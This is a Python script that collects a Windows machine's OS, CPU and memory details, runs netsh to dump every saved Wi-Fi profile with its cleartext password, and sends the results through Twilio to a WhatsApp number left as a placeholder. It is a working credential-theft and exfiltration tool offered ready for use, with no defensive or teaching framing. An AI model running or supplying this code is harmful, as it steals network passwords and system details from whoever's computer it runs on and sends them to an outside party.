#importing the necessary modules
from twilio.rest import Client
import platform
import os
import time
import psutil
import subprocess

#retrieve system info
osName = platform.system()
osVersion = platform.version()
osArchitecture = platform.architecture()[0]

#retrieve CPU information
cpuName = platform.processor()
cpuCores = psutil.cpu_count()
cpuFrequency = psutil.cpu_freq().max

#retrieve memory information
memorySize = round(psutil.virtual_memory().total / (1024.0 **3))

#print system information
A=("OS Name : " + osName)
B=("OS Version : " + osVersion)
C=("OS Architecture : " + osArchitecture)

#print CPU information
D=("CPU Name : " + cpuName)
E=("Number of CPU Cores : " + str(cpuCores))
F=("CPU Frequency : " + str(cpuFrequency) + "Mhz")

#print memory information
G=("Memory Size : " + str(memorySize) + "GB")

Z =(A,B,C)
Y =(D,)
X =(E,F,G)
W =tuple(Z+Y)+tuple(X)
V =str(W)

time.ctime(20)

#fetching saved wifi password using subprocess
data = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles']).decode('utf-8', errors="backslashreplace").split('\n')
profiles = [i.split(":")[1][1:-1] for i in data if "All User Profile" in i]

#formating saved wifi password
result = ""
for i in profiles:
    try:
        results = subprocess.check_output(['netsh', 'wlan', 'show', 'profile', i, 'key=clear']).decode('utf-8', errors="backslashreplace").split('\n')
        results = [b.split(":")[1][1:-1] for b in results if "Key Content" in b]
        try:
            result = result + " {0:<30}|  {1:<} \n".format(i, results[0])
        except IndexError:
            result = result + " {0:<30}|  {1:<} \n".format(i, "")
    except subprocess.CalledProcessError:
        print ("No Wifi Password Found")

# sending the password to the desired whatsapp number
account_sid = 'Your_account_sid'
auth_token = 'Your_auth_token'
client = Client(account_sid, auth_token)

message = client.messages.create(
    from_='whatsapp:Your_Twilio_number',
    body="Here is the saved Wifi Password'\n\n'" + result + V,
    to='whatsapp:Your_Whatsapp_number'
   )

print(message.sid)